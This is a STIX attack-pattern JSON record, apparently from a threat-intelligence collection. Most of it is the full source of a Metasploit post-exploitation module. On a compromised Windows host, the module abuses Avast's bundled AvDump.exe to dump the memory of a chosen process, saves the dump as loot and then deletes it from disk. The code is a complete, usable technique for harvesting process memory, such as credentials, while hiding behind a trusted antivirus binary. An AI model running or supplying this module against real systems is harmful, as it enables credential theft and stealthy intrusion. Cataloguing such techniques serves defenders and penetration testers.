{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07530b72-ac88-4977-9aa9-b8ce3fa8d6b5",
    "created": "2024-08-14T16:33:05.013471Z",
    "modified": "2024-08-14T16:33:05.013475Z",
    "name": "Avast AV Memory Dumping Utility",
    "description": " This module leverages an Avast Anti-Virus memory dump utility that is shipped by default with Avast Anti-Virus Home software suite.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/avast_memory_dump.rb",
            "external_id": "avast_memory_dump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rbconfig'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Avast AV Memory Dumping Utility',\n        'Description' => %q{\n          This module leverages an Avast Anti-Virus memory dump utility that is shipped\n          by default with Avast Anti-Virus Home software suite.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'DLL_Cool_J' ],\n        'Platform' => [ 'win'],\n        'SessionTypes' => [ 'meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('PID', [true, 'specify pid to dump' ]),\n      OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', 'C:\\\\Users\\\\Public\\\\tmp.dmp'])\n    ])\n  end\n\n  def avdump\n    avdump_paths = [\n      'Avast\\\\AvDump.exe',\n      'BreachGuard\\\\AvDump.exe',\n      'Cleanup\\\\AvDump.exe',\n      'Driver Updater\\\\AvDump.exe',\n      'SecureLine VPN\\\\AvDump.exe'\n    ]\n\n    base = expand_path('%PROGRAMFILES%\\\\Avast Software\\\\')\n    avdump_paths.each do |p|\n      if file_exist?(base + p.to_s)\n        return base + p.to_s\n      end\n    end\n  end\n\n  def run\n    fail_with(Failure::NotVulnerable, 'AvDump.exe does not exist on target.') unless avdump\n    print_status('AvDump.exe exists!')\n\n    dump_path = datastore['DUMP_PATH']\n    pid = datastore['PID'].to_s\n\n    print_status(\"Executing Avast memory dumping utility (#{avdump}) against pid #{pid} writing to #{dump_path}\")\n    result = cmd_exec(\"#{avdump} --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \\\"#{dump_path}\\\" --min_interval 0\")\n\n    fail_with(Failure::Unknown, \"Dump file #{dump_path} was not created\") unless file_exist?(dump_path)\n    print_status(dump_path)\n    mem_file = read_file(dump_path)\n    store_loot('host.avast.memdump', 'binary/db', session, mem_file)\n\n    print_status(result)\n    rm_f(dump_path)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}